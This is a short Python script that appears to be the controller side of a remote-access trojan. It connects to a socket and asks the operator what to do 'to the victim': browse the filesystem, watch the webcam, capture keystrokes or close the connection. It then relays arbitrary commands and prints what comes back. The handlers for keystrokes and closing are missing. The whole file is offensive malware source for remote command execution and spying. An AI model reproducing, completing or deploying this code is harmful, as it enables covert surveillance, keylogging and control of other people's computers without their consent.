#!/usr/bin/env python3

import socket

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    choice = input("What would you like to do to the victim: 1) check Filesystem"
          "2) Check Webcam 3) Capture keystrokes 4) Close Connection")
    s.send(choice.encode())
    if(int(choice) == 1):
        while True:
            cmd = input(">> ")
            if str(cmd) == 'END':
                break
            s.send(cmd.encode())
            output = s.recv(1024)
            print('Received', repr(output))
    if(int(choice) == 2):
        while True:
            output = s.recv(1024)
            print(output.decode())